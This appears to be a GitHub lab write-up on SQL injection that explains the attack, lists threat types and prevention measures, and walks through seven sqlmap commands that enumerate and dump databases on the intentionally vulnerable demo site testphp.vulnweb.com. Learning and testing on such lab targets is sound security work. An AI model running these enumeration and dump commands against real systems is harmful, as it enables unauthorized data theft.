# SQL Injection Attack on testphp.vulnweb.com

<p align="center">
<img src="https://user-images.githubusercontent.com/110705457/233797495-399b0144-dc1d-4be1-9c31-f560f6e7afee.png" alt="SQL_injection"/></p>

***INTRODUCTION***

SQL Injection is a technique used to exploit user data through web page inputs by injecting SQL commands as statements. Basically, these statements can be used to manipulate the application’s web server by malicious users.

•	SQL injection is a code injection technique that might destroy your database.

•	SQL injection is one of the most common web hacking techniques.

•	SQL injection is the placement of malicious code in SQL statements, via web page input.

***TYPES***

<p align="center">
<img src="https://user-images.githubusercontent.com/110705457/233797564-2b9a91bf-e59e-4d55-a97a-be0b9cf72a2b.png" alt="types_of_SQLInjection" width="600"/></p>

***EXAMPLES***

| Types of Threat       | SQL Injection Examples                                                        |
| -------------         | -------------                                                                 |
| Spoofing              | Retrieve and use another user’s credentials,Modify Author value for messages  |
| Tampering             |	Modify product stock information, Change any other data in the database       |
| Repudiation           |	Delete transaction record and database event logs                             |
| Information disclosure|	Obtain saved credit card numbers, Gain insight into internal design of app    |
| Denial of service     |	Run resource-intensive SQL queries, Kill sqlservr.exe process                 |
| Elevation of privilege|	Retrieve and use administrator credentials, Run shell commands                |

***Prevention of SQL Injection***

Prevention of SQL Injection attacks is not an easy task. There is always a loophole inside the code which can be exploited by the attacker and gain access to the databases. But certain precautions can be taken to discover and mitigate the risk.

●	Routine Testing: To discover the SQL vulnerabilities one must routinely test the applications by performing Static Testing as well as Dynamic Testing.

●	Parameterized Query and ORM: To prevent SQL Injection, parameterized queries can be used so that the website doesn’t accept malicious code as some other input data.
There are developers who prefer to use Object Relational Mapping (ORM) framework for a seamless SQL translation.

●	Enforcing least privilege on database: Applications should ensure that each process or software component can have access only to the resources it needs. Admin level privileges shouldn’t be used unless it’s absolutely necessary.

●	Enabling Web Application Firewall (WAF): Even though it’s not as effective as other preventative measures, it still can discover and even prevent SQL Injection.

●	Use prepared statements and parameterized queries: Parameterized statements ensure that the parameters passed into the SQL statements are treated safely.

●	Object-relational mapping: Most development teams prefer to use Object Relational Mapping frameworks to translate SQL result sets into code objects more seamlessly.

●	Escaping inputs: It is a simple way to protect against most SQL injection attacks. Many languages have standard functions to achieve this. You need to be aware while using escape characters in your code base where an SQL statement is constructed.

***RESULTS AND OUTCOMES***

Step 1: List information about the existing databases
>$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –dbs

<img src="https://user-images.githubusercontent.com/110705457/233798823-c338cf6c-a0fd-47be-991c-7df3505e4cc7.png" width="800">

Step 2: List information about Tables present in a particular database
>$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –D acuart –tables

<img src="https://user-images.githubusercontent.com/110705457/233798919-68f5d49b-2e3e-473a-96fc-2277e54f7155.png" width="800">

Step 3: List information about the columns of a particular table
>$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –D acuart -T artists –columns

<img src="https://user-images.githubusercontent.com/110705457/233798958-880fea3b-f21e-4d1a-9f8c-37d4d4f6b4c1.png" width="800">

Step 4: Dump the data from the columns
>$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –D acuart -T artists -C aname –dump

<img src="https://user-images.githubusercontent.com/110705457/233798977-fd550658-3be3-4eda-8132-9c0229e0e068.png" width="800">

Step 5: To Identify the current database user
>$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –current- user

<img src="https://user-images.githubusercontent.com/110705457/233799034-95855248-4e94-4cfa-87cb-612b3f23ceec.png" width="800">

Step 6: Identify current database name
>$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –current-db

<img src="https://user-images.githubusercontent.com/110705457/233799061-e4031d7e-d2dd-4561-9653-a6ea9800feca.png" width="800"><img src="" width="800">

Step 7: Identify the privileges, roles, and if current DB user is the DB admin
>$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --privileges --roles --is-dba –hostname

<img src="https://user-images.githubusercontent.com/110705457/233799099-957af4f7-0b51-4b59-99e3-0175bf73ed38.png" width="800">

***CONCLUSION***

SQL Injection attacks can exploit an organization’s database and control a database server behind a web application. Because they are relatively easy to implement, and because the potential reward is great, SQL injection attacks are not uncommon. Statistics vary, but it’s estimated that SQL injection attacks comprise the majority of attacks on software applications. According to the Open Web Application Security Project, injection attacks, which include SQL injections, were the third most serious web application security risk in 2021.

SQL Injection is a very popular attack method for Cyber Criminals. But taking proper precautions like ensuring the Data is Encrypted, Performing Security tests and by being up to date with patches, one can take meaningful steps toward keeping the data secure.

